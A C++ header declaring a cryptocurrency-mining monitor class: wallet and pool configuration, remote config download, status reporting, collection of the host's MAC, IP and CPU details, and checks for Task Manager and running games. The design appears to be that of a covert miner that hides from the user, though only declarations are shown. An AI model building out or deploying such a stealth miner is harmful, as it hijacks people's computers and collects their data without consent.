#pragma once
#include "Utility.h"

struct tMining
{
	CString name;					// 币子
	CString addr;					// 钱包
	CString cmd;					// 启动命令行
	vector<CString> pools;			// 矿池列表
};

typedef struct _tConfigInfo
{
	INT   UseCore;
	DWORD ValidTime;
	DWORD MonTime;
	DWORD Max;
	DWORD Min;
	DWORD Cpu_MinCore;
	DWORD Game_MinCore;
	CString Cpu_Name;
	//CString poolhost;
	//CString poolurl;
	//CString addr;
	//CString mining;
	vector<tMining> vMining;
	vector<CString> vProcList;
	vector<CString> vGameList;
	vector<CString> vCpuGameList;
} CONFIGINFO;

class CMonitor
{
public:
	static CMonitor* GetInstance()
	{
		static CMonitor obj;

		return &obj;
	}
	
	~CMonitor() {};

public:
	BOOL StartMonitor(LPTSTR lpCmdLine);
	

private:
	CMonitor() { m_hProcess = NULL; m_dwMiningIndex = 0; }

	BOOL GetPoolsUrl(CString &strUrl);

	BOOL StartWorker(CString &strWalletAddres);
	BOOL StopWorker();
	BOOL IsRun();
	BOOL EnumTaskMgr();
	BOOL GetUserInfo(LPTSTR lpCmdLine);
	BOOL GetConfigUrl(CString &strOutUrl);
	BOOL DownloadConfFile(CString &strUrl, CString &strFileName);
	BOOL ReadConfigParam();
	BOOL SendRuningStatus(CString strUserType, DWORD dwErrCode);
	BOOL GetWalletAddres(LPTSTR szUserName, CString &strWalletAddres);
	BOOL GetPoolsList();
	BOOL GetSystemInfo();
	BOOL SetUseCoreCount();
	BOOL IsExit();

	HANDLE m_hProcess;
	DWORD  m_dwCpus;
	DWORD  m_dwCoreNum;
	DWORD  m_dwThreadNum;
	CString m_strCpuName;
	CString m_strMac;
	CString m_strSys;
	CString m_strIP;
	DWORD m_dwMiningIndex;
};